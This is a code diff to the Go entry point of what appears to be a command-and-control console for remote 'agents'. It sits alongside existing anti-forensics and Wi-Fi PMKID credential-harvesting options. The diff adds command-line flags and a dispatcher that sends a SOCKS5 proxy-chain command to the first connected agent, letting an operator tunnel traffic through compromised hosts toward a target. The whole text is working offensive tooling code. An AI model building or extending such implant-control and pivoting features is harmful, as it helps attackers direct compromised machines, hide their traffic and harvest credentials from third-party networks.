@@ -181,6 +181,9 @@ func main() {
 	antiForenDry := flag.Bool("antiforen-dry", false, "print actions without executing")
 	mailTrace := flag.String("mailtrace", "", "analyze an email: pass .eml path, or @FILE for a raw header blob")
 	geoIP := flag.String("geoip", "", "classify IPs: comma-separated list")
+	proxyChain := flag.String("proxy-chain", "", "SOCKS5 chain spec: host1:port1,host2:port2,...")
+	proxyChainTarget := flag.String("proxy-chain-target", "", "final target host:port (optional)")
+	proxyChainTimeout := flag.Int("proxy-chain-timeout", 15, "per-hop timeout (seconds)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -633,6 +636,22 @@ func main() {
 			}
 		}
 		go runGeoIPDispatch(mgr, ips)
+	}
+
+	// proxy chain dispatch — test a SOCKS5 chain on the first agent
+	if *proxyChain != "" {
+		var hops []string
+		for _, h := range strings.Split(*proxyChain, ",") {
+			h = strings.TrimSpace(h)
+			if h != "" {
+				hops = append(hops, h)
+			}
+		}
+		go runProxyChainDispatch(mgr, proxyChainArgs{
+			Hops:    hops,
+			Target:  *proxyChainTarget,
+			Timeout: *proxyChainTimeout,
+		})
 	}
 
 	if *dnsBind != "" {
@@ -1613,5 +1632,31 @@ func runGeoIPDispatch(mgr *session.Manager, ips []string) {
 	req := proto.GeoIPStart{SessionID: sessionID, IPs: ips}
 	if err := s.SendGeoIPStart(sessionID, req); err != nil {
 		log.Printf("[geoip] start: %v", err)
+	}
+}
+
+// proxyChainArgs carries the operator's -proxy-chain* flags.
+type proxyChainArgs struct {
+	Hops    []string
+	Target  string
+	Timeout int
+}
+
+// runProxyChainDispatch waits for the first agent, sends a ProxyChainStart.
+func runProxyChainDispatch(mgr *session.Manager, a proxyChainArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("pc-%d", time.Now().UnixNano())
+	log.Printf("[proxychain] %d hops -> %s", len(a.Hops), s.AgentID)
+	req := proto.ProxyChainStart{
+		SessionID: sessionID,
+		Hops:      a.Hops,
+		Target:    a.Target,
+		Timeout:   a.Timeout,
+	}
+	if err := s.SendProxyChainStart(sessionID, req); err != nil {
+		log.Printf("[proxychain] start: %v", err)
 	}
 }
